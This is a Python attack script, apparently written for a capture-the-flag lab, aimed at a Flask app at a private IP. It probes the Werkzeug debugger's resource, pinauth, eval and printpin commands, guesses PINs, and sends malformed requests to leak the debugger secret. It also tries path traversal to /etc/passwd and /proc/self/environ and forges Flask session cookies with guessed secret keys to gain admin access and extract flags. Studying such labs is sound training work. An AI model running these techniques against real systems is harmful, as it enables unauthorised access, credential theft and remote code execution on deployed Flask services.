import requests
import re

BASE = "http://10.114.139.59:5000"
FLAG_RE = re.compile(r"THM\{[^}]+\}")
s = requests.Session()

# The Werkzeug debugger middleware intercepts ?__debugger__=yes on ANY URL
# Let's test specific debugger commands

print("=== Werkzeug debugger middleware probe ===")

# 1) Check if debugger middleware is active - try resource command
# This returns debugger static files (JS/CSS) if middleware is present
for endpoint in ["/", "/cupids_secret_vault/", "/console", "/nonexist"]:
    r = s.get(f"{BASE}{endpoint}", params={
        "__debugger__": "yes",
        "cmd": "resource", 
        "f": "debugger.js"
    }, timeout=5)
    print(f"  {endpoint}?...resource&f=debugger.js -> {r.status_code} ({len(r.text)} bytes)")
    if r.status_code == 200 and len(r.text) > 500:
        print(f"    [!!!] Debugger JS returned! First 200 chars: {r.text[:200]}")
        break

# 2) Try debugger CSS
r = s.get(f"{BASE}/", params={
    "__debugger__": "yes",
    "cmd": "resource",
    "f": "style.css"
}, timeout=5)
print(f"\n  resource style.css -> {r.status_code} ({len(r.text)} bytes)")
if r.status_code == 200 and len(r.text) > 100:
    print(f"    [!!!] Debugger CSS returned!")

# 3) Try PIN auth with cupid_arrow_2026!!!
print("\n=== PIN auth attempts ===")
# The s parameter might be optional or we can try various values
pins = [
    "cupid_arrow_2026!!!",
    "cupid_arrow_2026",
    "2026",
    "cupid",
    "arrow",
]

# Try on different endpoints
for endpoint in ["/", "/console", "/cupids_secret_vault/"]:
    for pin in pins:
        for s_val in ["", "0", "1", "abc", "secret", "cupid_arrow_2026!!!"]:
            r = s.get(f"{BASE}{endpoint}", params={
                "__debugger__": "yes",
                "cmd": "pinauth",
                "pin": pin,
                "s": s_val
            }, timeout=5)
            if r.status_code == 200 and ("true" in r.text.lower() or "auth" in r.text.lower() or len(r.text) < 50):
                print(f"  {endpoint} pin={pin} s={s_val} -> {r.status_code}: {r.text[:200]}")
            elif r.status_code not in [400, 404]:
                print(f"  {endpoint} pin={pin} s={s_val} -> {r.status_code}: {r.text[:200]}")

# 4) Try to get the debugger secret by triggering an error
# Maybe we can use a POST with bad data that the app tries to parse
print("\n=== Error triggering attempts ===")

# Send request with bad Content-Type that Flask tries to parse
error_requests = [
    # Bad JSON body
    lambda: s.post(f"{BASE}/", data=b'\x80\x81\x82', headers={"Content-Type": "application/json"}),
    # Multipart with bad boundary
    lambda: s.post(f"{BASE}/", data=b'bad', headers={"Content-Type": "multipart/form-data; boundary="}),
    # Request with duplicate Content-Length
    lambda: requests.request("GET", f"{BASE}/", headers={"Content-Length": "0", "Transfer-Encoding": "chunked"}),
    # Very large Content-Length
    lambda: s.post(f"{BASE}/", data=b"x", headers={"Content-Type": "application/x-www-form-urlencoded", "Content-Length": "999999"}),
]

for i, fn in enumerate(error_requests):
    try:
        r = fn()
        if r.status_code == 500:
            print(f"  Request {i} -> 500 ERROR!")
            print(f"  {r.text[:1000]}")
            # Look for debugger secret
            secret_match = re.search(r'SECRET\s*=\s*["\']([^"\']+)["\']|s=([a-zA-Z0-9]+)', r.text)
            if secret_match:
                print(f"  [SECRET] {secret_match.group()}")
        elif r.status_code not in [200, 400, 404, 405]:
            print(f"  Request {i} -> {r.status_code}: {r.text[:300]}")
    except Exception as e:
        print(f"  Request {i} -> {e}")

# 5) Maybe we need to trigger the debugger by causing a ZeroDivision or similar
# via template injection or eval
# Try paths that might cause errors in the app's route handling
print("\n=== Path-based error triggers ===")
error_paths = [
    "/cupids_secret_vault/../../",
    "/cupids_secret_vault/<script>",
    "/cupids_secret_vault/{{}}",
    "/cupids_secret_vault/%0a%0d",
    "/cupids_secret_vault/\x00",
    "/cupids_secret_vault/../../../proc/self/environ",
    "/static/../../etc/passwd",
    "/static/../app.py",
]
for p in error_paths:
    try:
        r = s.get(f"{BASE}{p}", timeout=5)
        if r.status_code == 500:
            print(f"  {p} -> 500!")
            print(f"  {r.text[:500]}")
    except:
        pass

# 6) Maybe the Werkzeug debugger is NOT at /console
# In Werkzeug, the debugger doesn't create a /console route
# /console is a feature OF the debugger that's available AFTER auth
# The debugger middleware wraps all requests

# Try: access the debugger's own frame evaluation
# This works if there are saved tracebacks
for frame_id in range(0, 10):
    r = s.get(f"{BASE}/", params={
        "__debugger__": "yes",
        "cmd": "eval",
        "frm": str(frame_id),
        "s": "0"
    }, timeout=5)
    if r.status_code == 200:
        print(f"  frame {frame_id} eval -> {r.status_code}: {r.text[:200]}")

# 7) Check if the debugger has been triggered by someone else
# and we can piggyback on their traceback
r = s.get(f"{BASE}/", params={
    "__debugger__": "yes",
    "cmd": "printpin",
    "s": "0"
}, timeout=5)
print(f"\n  printpin -> {r.status_code}: {r.text[:200]}")

# 8) Maybe the app is NOT running with debug=True
# And /console is a custom route
# But it returns 400 which means it needs specific params
# Let's try the absolute basic: maybe it needs just an empty JSON body
print("\n=== /console with different body types ===")
import json

# Empty JSON object
r = s.post(f"{BASE}/console", json={}, timeout=5)
print(f"  POST JSON {{}} -> {r.status_code}: {r.text[:200]}")

# Empty JSON array
r = s.post(f"{BASE}/console", json=[], timeout=5)
print(f"  POST JSON [] -> {r.status_code}: {r.text[:200]}")

# Just a string
r = s.post(f"{BASE}/console", json="cupid_arrow_2026!!!", timeout=5)
print(f"  POST JSON string -> {r.status_code}: {r.text[:200]}")

# Raw body
r = s.post(f"{BASE}/console", data=b"cupid_arrow_2026!!!", 
           headers={"Content-Type": "text/plain"}, timeout=5)
print(f"  POST text/plain -> {r.status_code}: {r.text[:200]}")

# XML
r = s.post(f"{BASE}/console", 
           data='<pin>cupid_arrow_2026!!!</pin>',
           headers={"Content-Type": "application/xml"}, timeout=5)
print(f"  POST XML -> {r.status_code}: {r.text[:200]}")

# 9) WAIT - maybe /console gives 400 because it's Werkzeug's debugger
# and the debugger is enabled but needs a valid cookie.
# Let's look at what Werkzeug's DebuggedApplication does when you
# access /console:
# - If PIN is not valid (no cookie), returns 403 or 400
# - We need to provide PIN first via pinauth command

# The PIN auth works on __debugger__=yes requests
# But our test showed 404 for that. Why?
# Maybe because the debugger is NOT enabled as a middleware
# but the app has its own /console route

# Let me try accessing /__debugger__ directly
print("\n=== Direct debugger paths ===")
for p in ["/__debugger__", "/__debug__", "/_debugger", "/_debug"]:
    r = s.get(f"{BASE}{p}", timeout=5)
    print(f"  {p} -> {r.status_code}")
    if r.status_code not in [404]:
        print(f"    {r.text[:200]}")

# 10) COMPLETELY DIFFERENT APPROACH
# What if the "vulnerability" mentioned in the task is NOT the debugger
# but something else? Like:
# - The password cupid_arrow_2026!!! is for something specific
# - Maybe we need to use it as a Flask session secret key
# - And forge a session cookie to access the vault

print("\n=== Flask session cookie forging ===")
# If cupid_arrow_2026!!! is the Flask SECRET_KEY...
# We can craft a session cookie
try:
    from flask import Flask
    from flask.sessions import SecureCookieSessionInterface
    from itsdangerous import URLSafeTimedSerializer
    
    # Try to create a signed session cookie with the secret
    secret_keys = [
        "cupid_arrow_2026!!!",
        "cupid_arrow_2026",
        "CUPID_ARROW_2026!!!",
    ]
    
    for secret in secret_keys:
        serializer = URLSafeTimedSerializer(
            secret,
            salt="cookie-session",
            signer_kwargs={
                "key_derivation": "hmac",
                "digest_method": "sha1"
            }
        )
        
        # Try different session payloads
        payloads = [
            {"admin": True},
            {"is_admin": True},
            {"role": "admin"},
            {"user": "admin"},
            {"authenticated": True},
            {"logged_in": True},
            {"access": "granted"},
            {"vault_access": True},
            {"unlocked": True},
        ]
        
        for payload in payloads:
            cookie = serializer.dumps(payload)
            r = s.get(f"{BASE}/cupids_secret_vault/", 
                     cookies={"session": cookie}, timeout=5)
            if len(r.text) != 1064 or r.status_code != 200:
                print(f"  secret={secret} payload={payload} -> DIFFERENT!")
                print(f"    {r.status_code} ({len(r.text)} bytes): {r.text[:300]}")
                for f in FLAG_RE.findall(r.text):
                    print(f"    [FLAG] {f}")
            
            # Also try on /console
            r = s.get(f"{BASE}/console", 
                     cookies={"session": cookie}, timeout=5)
            if r.status_code != 400:
                print(f"  /console with secret={secret} payload={payload} -> {r.status_code}")
                print(f"    {r.text[:300]}")
                for f in FLAG_RE.findall(r.text):
                    print(f"    [FLAG] {f}")
                    
except ImportError:
    print("  Flask not installed locally, trying with itsdangerous directly...")
    from itsdangerous import URLSafeTimedSerializer
    
    for secret in ["cupid_arrow_2026!!!", "cupid_arrow_2026"]:
        serializer = URLSafeTimedSerializer(
            secret,
            salt="cookie-session",
            signer_kwargs={
                "key_derivation": "hmac",
                "digest_method": "sha1"
            }
        )
        
        payloads = [
            {"admin": True},
            {"is_admin": True},
            {"role": "admin"},
            {"authenticated": True},
            {"vault_access": True},
        ]
        
        for payload in payloads:
            cookie = serializer.dumps(payload)
            r = s.get(f"{BASE}/cupids_secret_vault/", 
                     cookies={"session": cookie}, timeout=5)
            if len(r.text) != 1064:
                print(f"  [HIT] secret={secret} payload={payload}")
                print(f"    {r.text[:300]}")
                for f in FLAG_RE.findall(r.text):
                    print(f"    [FLAG] {f}")
            
            r = s.get(f"{BASE}/console", 
                     cookies={"session": cookie}, timeout=5)
            if r.status_code != 400:
                print(f"  [HIT /console] secret={secret} payload={payload} -> {r.status_code}")
                print(f"    {r.text[:300]}")

print("\nDone.")
